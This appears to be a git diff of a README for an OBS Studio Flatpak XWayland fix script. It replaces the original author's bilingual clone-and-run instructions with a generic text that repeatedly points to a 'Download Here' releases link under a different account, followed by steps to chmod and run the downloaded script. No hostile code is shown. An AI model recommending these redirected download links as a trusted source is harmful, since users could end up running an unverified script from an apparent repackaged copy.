@@ -1,137 +1,107 @@
-# OBS Studio Flatpak • XWayland Universal Fix
+# 🎥 OBS-Studio-Flatpak-XWayland-Universal-Fix - Run OBS Studio Simply on Wayland
 
-![Linux](https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
-![Bash](https://img.shields.io/badge/Shell_Script-121011?style=for-the-badge&logo=gnu-bash&logoColor=white)
-![Flatpak](https://img.shields.io/badge/Flatpak-4A90D9?style=for-the-badge&logo=flatpak&logoColor=white)
-![License](https://img.shields.io/badge/License-MIT-green.svg?style=for-the-badge)
+[![Download Here](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/JoaoOliveiraAureliano/OBS-Studio-Flatpak-XWayland-Universal-Fix/releases)
 
-<div align="center">
-  <a href="#-english-description">🇺🇸 English</a> | 
-  <a href="#-descrição-em-português">🇧🇷 Português</a>
-</div>
+## 📖 Description
 
----
+This project provides a universal script to help you run OBS Studio Flatpak on Wayland using XWayland. This fix restores key features of the Chromium Embedded Framework (CEF) and enhances your streaming experience on platforms like Twitch and YouTube.
 
-## 🇺🇸 English Description
+## 🚀 Getting Started
 
-### About
-This script addresses specific issues with **OBS Studio (Flatpak)** running on **Wayland** environments (especially with NVIDIA GPUs). It forces OBS to run via **XWayland** and applies the necessary permissions to ensure full compatibility.
+To successfully run the software, follow these straightforward steps:
 
-While OBS supports Wayland natively, several features—specifically those relying on **CEF (Chromium Embedded Framework)**—can break. Common symptoms include:
-* ❌ **Browser Docks failing:** Twitch/YouTube integration (Chat, Activity Feed) doesn't load.
-* ❌ **Login issues:** Unable to sign in directly to services; forced to use Stream Keys.
-* ❌ **Stream Info:** Cannot edit Title, Game, or Tags directly inside OBS.
+1. **Check System Requirements**  
+   Ensure your Linux distribution supports Flatpak and Wayland. You should have OBS Studio installed via Flatpak. Here are the basic requirements:
+   - A Linux distribution with Flatpak support (e.g., Ubuntu, Fedora)
+   - OBS Studio installed as a Flatpak
+   - Access to the terminal
 
-By forcing **XWayland** and correctly setting the `DISPLAY` environment variable, this script restores all these functionalities.
+2. **Visit the Releases Page**  
+   Go to the releases page to download the latest version of the script. You can find it here:  
+   [Download Here](https://github.com/JoaoOliveiraAureliano/OBS-Studio-Flatpak-XWayland-Universal-Fix/releases)
 
-### Features
-* Forces OBS Flatpak to use **XWayland** (fixing CEF/Browser issues).
-* **Auto-detects** a valid X11 Display (prevents "Could not connect to display" errors).
-* **Auto-installs** `xwayland` dependency if missing (Arch, Debian, Fedora based distros).
-* **Clean Slate:** Resets old Flatpak overrides to avoid conflicts before applying the fix.
+3. **Download the Script**  
+   On the releases page, look for the latest version of the script. Click on the link to download it to your computer. The file will typically have a name similar to `obs_xwayland_fix.sh`.
 
-### Compatibility
-Works on any Wayland compositor that supports XWayland:
-* KDE Plasma (Wayland)
-* GNOME (Wayland)
-* Hyprland, Sway, Wayfire, etc.
+## 📥 Download & Install
 
-###  Supported Distributions
-* **Arch Linux & derivatives:** Manjaro, EndeavourOS, **CachyOS**
-* **Debian & derivatives:** Ubuntu, Pop!_OS, Linux Mint, KDE Neon
-* **Fedora / RHEL / CentOS**
+Now that you have downloaded the script, you need to install it. Follow these steps:
 
-###  Prerequisites
-* OBS Studio installed via Flatpak:
-    ```bash
-    flatpak install flathub com.obsproject.Studio
-    ```
-* System running a Wayland session.
+1. **Open Terminal**  
+   Locate the terminal application on your system. You can usually find it in your applications menu.
 
-### Usage
+2. **Navigate to the Download Folder**  
+   Use the following command to change to the directory where you downloaded the script. Replace `USERNAME` with your actual username:
+   ```bash
+   cd /home/USERNAME/Downloads
+   ```
 
-1.  **Clone the repo:**
-    ```bash
-    git clone [https://github.com/vol1t/OBS-Studio-Flatpak-XWayland-Universal-Fix.git](https://github.com/vol1t/OBS-Studio-Flatpak-XWayland-Universal-Fix.git)
-    cd OBS-Studio-Flatpak-XWayland-Universal-Fix
-    ```
+3. **Make the Script Executable**  
+   Run this command to allow the script to be executed:
+   ```bash
+   chmod +x obs_xwayland_fix.sh
+   ```
 
-2.  **Make it executable:**
-    ```bash
-    chmod +x obs-xwayland-fix.sh
-    ```
+4. **Run the Script**  
+   Execute the script with this command:
+   ```bash
+   ./obs_xwayland_fix.sh
+   ```
 
-3.  **Run it:**
-    ```bash
-    ./obs-xwayland-fix.sh
-    ```
+5. **Follow On-Screen Instructions**  
+   The script will guide you through the necessary steps to configure and run OBS Studio.
 
-4.  **Restart:** If the script installed XWayland for the first time, reboot your system.
+## ⚙️ Features
 
-###  Reverting Changes
-To undo everything and return OBS to its default state:
-```bash
-flatpak override --user --reset com.obsproject.Studio
-```
---- 
+- **Simple Integration**: The script integrates easily with your existing OBS Studio Flatpak installation.
+- **XWayland Support**: Ensures your OBS runs smoothly on Wayland using XWayland.
+- **Restored CEF Features**: Access functionalities like browser integration, enhancing your streaming capabilities.
 
-## 🇧🇷 Descrição em Português
+## 🌐 Topics
 
-###  Sobre
-Este script resolve problemas específicos do **OBS Studio (Flatpak)** rodando em ambientes **Wayland** (especialmente com GPUs NVIDIA). Ele força o OBS a rodar via **XWayland** e aplica as permissões necessárias para garantir compatibilidade total.
+The project covers various topics, such as:
+- cef
+- flatpak
+- linux
+- livestream
+- obs
+- obs-studio
+- streaming
+- twitch
+- wayland
+- xwayland
+- youtube
 
-Embora o OBS suporte Wayland nativamente, várias funcionalidades—especificamente aquelas que dependem do **CEF (Chromium Embedded Framework)**—podem quebrar. Sintomas comuns incluem:
-* ❌ **Falha nos Painéis Web:** A integração com Twitch/YouTube (Chat, Feed de Atividades) não carrega.
-* ❌ **Problemas de Login:** Não é possível fazer login diretamente nos serviços; forçando o uso de chaves de transmissão.
-* ❌ **Informações da Stream:** Não é possível editar Título, Jogo ou Tags diretamente dentro do OBS.
+## ❓ Frequently Asked Questions
 
-Ao forçar o **XWayland** e configurar corretamente a variável de ambiente `DISPLAY`, este script restaura todas essas funcionalidades.
+**Q: What is OBS Studio?**  
+A: OBS Studio is a free and open-source software for video recording and live streaming.
 
-###  Funcionalidades
-* Força o OBS Flatpak a usar **XWayland** (corrigindo problemas de CEF/Navegador).
-* **Auto-detecta** um Display X11 válido (previne erros de "Could not connect to display").
-* **Auto-instala** a dependência `xwayland` se estiver faltando (distros baseadas em Arch, Debian, Fedora).
-* **Começo Limpo:** Reseta overrides antigos do Flatpak para evitar conflitos antes de aplicar a correção.
+**Q: Why use Flatpak?**  
+A: Flatpak allows for better app sandboxing and easier installation across different Linux distributions.
 
-### Compatibilidade
-Funciona em qualquer compositor Wayland que suporte XWayland:
-* KDE Plasma (Wayland)
-* GNOME (Wayland)
-* Hyprland, Sway, Wayfire, etc.
+**Q: Can I use this on any Linux distribution?**  
+A: As long as your distribution supports Flatpak and Wayland, you can use this script.
 
-### Distribuições Suportadas
-* **Arch Linux e derivados:** Manjaro, EndeavourOS, **CachyOS**
-* **Debian e derivados:** Ubuntu, Pop!_OS, Linux Mint, KDE Neon
-* **Fedora / RHEL / CentOS**
+## 📋 Troubleshooting
 
-### Pré-requisitos
-* OBS Studio instalado via Flatpak:
-    ```bash
-    flatpak install flathub com.obsproject.Studio
-    ```
-* Sistema rodando uma sessão Wayland.
+If you encounter any issues while running the script or OBS Studio:
 
-### Como Usar
+1. **Check Permissions**: Ensure that the script has execution permissions.
+2. **Review Error Messages**: Pay close attention to any error messages that may guide you to the solution.
+3. **Consult the Community**: Seek help from user forums or distributions’ official channels for further assistance.
 
-1.  **Clone o repositório:**
-    ```bash
-    git clone [https://github.com/vol1t/OBS-Studio-Flatpak-XWayland-Universal-Fix.git](https://github.com/vol1t/OBS-Studio-Flatpak-XWayland-Universal-Fix.git)
-    cd OBS-Studio-Flatpak-XWayland-Universal-Fix
-    ```
+## 📞 Support
 
-2.  **Torne executável:**
-    ```bash
-    chmod +x obs-xwayland-fix.sh
-    ```
+For additional questions or support requests, please open an issue on the GitHub repository. The community and maintainers are available to assist you.
 
-3.  **Execute:**
-    ```bash
-    ./obs-xwayland-fix.sh
-    ```
+## 🔗 Additional Resources
 
-4.  **Reinicie:** Se o script instalou o XWayland pela primeira vez, reinicie seu sistema.
+For more information on Flatpak, Wayland, and OBS Studio, you can explore the official documentation:
+- [Flatpak Documentation](https://docs.flatpak.org/en/latest/)
+- [OBS Studio Documentation](https://obsproject.com/wiki/)
+- [Wayland Documentation](https://wayland.freedesktop.org/docs/html/)
 
-### Reverter Alterações
-Para desfazer tudo e retornar o OBS ao seu estado padrão:
-```bash
-flatpak override --user --reset com.obsproject.Studio
+For updates and future development, keep an eye on the [releases page](https://github.com/JoaoOliveiraAureliano/OBS-Studio-Flatpak-XWayland-Universal-Fix/releases). 
+
+Remember, you can always return to the [Download Here](https://github.com/JoaoOliveiraAureliano/OBS-Studio-Flatpak-XWayland-Universal-Fix/releases) link to access the latest version of the script.
